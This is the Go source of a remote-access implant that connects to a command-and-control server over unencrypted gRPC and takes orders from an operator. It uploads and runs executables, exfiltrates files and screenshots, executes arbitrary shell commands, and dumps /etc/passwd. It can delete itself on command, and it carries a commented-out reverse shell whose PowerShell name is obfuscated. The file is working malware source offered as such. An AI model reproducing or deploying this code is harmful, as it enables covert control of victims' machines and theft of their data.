package agent

import (
  //"io"
  "os"
  "fmt"
  //"log"
  "time"
  "strings"
  "os/exec"
  "context"
  "runtime"
  "io/ioutil"

  "odin/lib/c2"
  "odin/lib/utils"
  "odin/lib/penguins/zoo"
  "odin/wheagle/server/grpcapi"
  "google.golang.org/grpc"
)

type ImplantClientWrapper struct{
  Address string
  MothershipID string
  IClient grpcapi.ImplantClient
  Conn *grpc.ClientConn
}

func InitializeImplantClient(address,msid string,secure bool) (*ImplantClientWrapper,error){
  var (
    opts []grpc.DialOption
    client grpcapi.ImplantClient
  )
  opts = append(opts,grpc.WithMaxMsgSize(2 * 1024 * 1024 * 1024))
  if secure {
    return nil,fmt.Errorf("To be implemented soon")
  }
  opts = append(opts,grpc.WithInsecure())
  conn,err := grpc.Dial(address,opts...)
  if err != nil{
    return nil,err
  }
  client = grpcapi.NewImplantClient(conn)
  return &ImplantClientWrapper {
    Address: address,
    MothershipID: msid,
    IClient: client,
    Conn: conn,
  },nil
}

func (iw *ImplantClientWrapper) Close() error{
  return iw.Conn.Close()
}


//var IsAlive bool
type Implant struct{
  Address string
  TunnelAddress string
  ISession *c2.Session
  OS string
}

func (i *Implant) RunGRPCImplant(){
  var output string
  var IsAlive bool
  CreateClient:
  iClient,err := InitializeImplantClient(i.Address,i.ISession.SessionID,false)
  if err != nil{
    utils.Logerror(err)
  }
  //defer iClient.Close()
  var Register = func(){
    //send an indicator of msid to ensure heredity
    fmt.Println("My ID is: ",i.ISession.SessionID)
    ctx := context.Background()
    var auth = new(grpcapi.Auth)
    auth.UserId = i.ISession.SessionID
    auth.MSId = i.ISession.MotherShipID
    auth,err := iClient.IClient.RunAuthentication(ctx,auth)
    if err != nil { utils.Logerror(err); return }
    if !auth.Authenticated { IsAlive = false;utils.DangerPanic(fmt.Errorf("Find your own mother")) }
    IsAlive =  true
    fmt.Println("Registered minion with ID......",i.ISession.SessionID)
  }
  //IsAlive = true
  if !IsAlive { time.Sleep(2 * time.Second); Register()}
  /*var SendClearSignal = func(){
  }()*/
  START:
  ctx := context.Background()
  for {
    var req = new(grpcapi.Command)
    req.UserId = i.ISession.SessionID
    cmd,err := iClient.IClient.FetchCommand(ctx,req)
    if err != nil{
      utils.Warning(fmt.Sprintf("%s",err)); time.Sleep(5 * time.Second); goto CreateClient;
      //return (return to start to prevent implant from exiting )or just sleep
    }
    switch cmd.In {
      case "":
        time.Sleep(5 * time.Second)
        goto START
      case "No Work.":
        time.Sleep(5 * time.Second)
        goto START
      case "getos":
        output = runtime.GOOS
        cmd.Out += output
        iClient.IClient.SendOutput(ctx,cmd)
        goto START
      case "upload":
        var pid int
        var fl = new(grpcapi.File);var msg = new(grpcapi.FileMessage)
        if fl,err = iClient.IClient.ReceiveUpload(context.Background(),cmd); err != nil{
          utils.Logerror(err);goto START
        }
        //write file to disk
        if err = os.WriteFile(cmd.Out,fl.Data,0750); err != nil{
          msg.Done = false;msg.Name = fmt.Sprintf("%s",err)
          if _,err = iClient.IClient.SendUploadReport(context.Background(),msg); err != nil{
            utils.Logerror(err);goto START
          }
          goto START
        }
        msg.Done = true
        msg.Name = cmd.Out
        if !fl.Run{
          if _,err = iClient.IClient.SendUploadReport(context.Background(),msg); err != nil{
            utils.Logerror(err);goto START
          }
          goto START
        }
        if i.OS == "windows"{
          if pid,err = utils.RunExecutable(`.\`+fl.Name); err != nil{
            msg.Directory = fmt.Sprintf("Error running executable.\n%q",err)
            if _,err = iClient.IClient.SendUploadReport(context.Background(),msg); err != nil{
              utils.Logerror(err);goto START
            }
            goto START
          }
          msg.Pid = int32(pid)
          if _,err = iClient.IClient.SendUploadReport(context.Background(),msg); err != nil{
            utils.Logerror(err);goto START
          }
          goto START
        }
        if pid,err = utils.RunExecutable("./"+fl.Name); err != nil{
           msg.Directory = fmt.Sprintf("Error runing executable. \n%s",err)
           if _,err = iClient.IClient.SendUploadReport(context.Background(),msg); err != nil{
             utils.Logerror(err);goto START
           }
           goto START
        }
        msg.Pid = int32(pid)
        if _,err = iClient.IClient.SendUploadReport(context.Background(),msg); err != nil{
          utils.Logerror(err);goto START
        }
        goto START
      case "download":
        var fl = new(grpcapi.File)
        fl.Data,err = ioutil.ReadFile(cmd.Out)
        if err != nil{
          utils.Logerror(err); goto START
        }
        fl.Name = cmd.OperatorId
        if _,err := iClient.IClient.SendDownload(context.Background(),fl); err != nil {
          utils.Logerror(err)
        }
        goto START
      case "screenshot":
        var scrnshts []string
        screenshots := zoo.TakeScreenShot()
        for _,s := range screenshots.SCS{
          scrnshts = append(scrnshts,s.Screenshot)
        }
        scnt := &grpcapi.Screenshots{
          UserId: cmd.Out,
          Screenshot: scrnshts,
        }
        iClient.IClient.TakeScreenShot(context.Background(),scnt)
        goto START
      case "shell":
      case "exit":
        output = "Exiting out..."
        goto EXIT
      case "gud":
        output = "Getting user data....."
        goto SEND
      case "suicide":
        output = "Initiating kill chain..........."
        cmd.Out += output
        iClient.IClient.SendOutput(ctx,cmd)
        _ = os.Remove(os.Args[0])
        os.Exit(0)
      default:
        if cmd.UserId == i.ISession.SessionID && cmd.Individual {
          output = Execute(cmd.In)
          cmd.Out += output
          iClient.IClient.SendOutput(ctx,cmd)
          goto START
        } else { goto START }
    }
    SEND:
    cmd.Out += output
    iClient.IClient.SendOutput(ctx,cmd)
    goto START
    EXIT:
      cmd.Out += output
      iClient.IClient.SendOutput(ctx,cmd)
      if iClient.Conn != nil {  errs := iClient.Close(); utils.Logerror(errs)  }
      os.Exit(0)
  }
  if iClient.Conn != nil {  errs := iClient.Close(); utils.Logerror(errs)  };return
}

// change this to a gobuild of a specific type
func Execute(command string)(output string){
  switch command {
    case "update": //u[load from c2 or admin]
      output = "Run update function"
    case "download":
      output = " Downloading"
    case "close":
      output = "Closed interactive"
    case "netstat":
    case "whoami":
      output = Internal("whoami")
    case "ip addr"://ipconfig
    case "get-system":
    case "isgcc":
      output = Internal(`find / -name gcc -type f 2>/dev/null`)
    case "view-fstab":
      cmnd := `cat /etc/fstab`
      output = Internal(cmnd)
    case "passwd":
      if utils.GetCurrentOS() == "linux"{
        output = Internal(`cat /etc/passwd`)
      } else {
        output = "Find a way to dump sam files"
      }
    case "tunnel":
    case "ddos":
      return ""
    case "pivot":
      output =  ""
    case "migrate": //migrates into another process
    case "persist": //persists into the host past rebbot
    case "dive": // launches another process to execute commands for you
    case "getpid":
    case "alive":// say if active
    case "iploc":// geolocate by ip, Can be inaccurate
  case "getsystem":
    default:
      output = Internal(command)
  }
  return
}

var Internal = func(command string)(buf string) {
  tokens := strings.Split(command," ")
  var c *exec.Cmd
  //zoo.CommandExecuter(c)
  if len(tokens) == 1 {
    c = exec.Command(tokens[0])
  } else {
    c = exec.Command(tokens[0],tokens[1:]...)
  }
  out,err := c.CombinedOutput()
  if err != nil {
    buf = fmt.Sprintf("%s",err)
    return
  }
  buf = string(out)
  return buf
}



/* cliet should stream from stdout and write to connection while reading a request from  admin
func (i *Implant) StartRevShell(stream grpcapi.Implant_StartRevShellClient)error{
  var c *exec.Cmd
  if runtime.GOOS == "windows"{
    c = exec.Command(strings.ToLower(fmt.Sprintf("%s%s%s%s", "Po", "wEr", "sHEL", "l.exE")))
  } else {
    c = exec.Command("/bin/sh","-c", "/bin/sh -i")
  }
  //zoo.CommandExecuter(c)
  stdin,err := c.StdinPipe()
  if err != nil { return err }
  stdout,err := c.StdoutPipe()
  if err := c.Start();err != nil{
    return err
  }
  //read from stdout and write to admin
  go func(){
    buf := make([]byte,2042)
    for{
      n,err := stdout.Read(buf)
      if err != nil{
        if err != io.EOF {
          log.Printf("Error reading from stdout: %v",err)
        }
        return
        if err := stream.Send(&grpcapi.ReverseShellResponse{Output:buf[:n]});err != nil{
          log.Printf("Error sending output to adminC2: %v",err)
          return
        }
      }
    }
    }()
  //read from admin and write to srdin
  for {
    req,err := stream.Recv()
    if err == io.EOF {
      break
    }
    if err != nil { return err }
    if _,err := stdin.Write(req.GetInput()); err != nil{
      return err
    }
  }
  if err := c.Wait(); err != nil{
    return err
  }
  return nil
}
*/
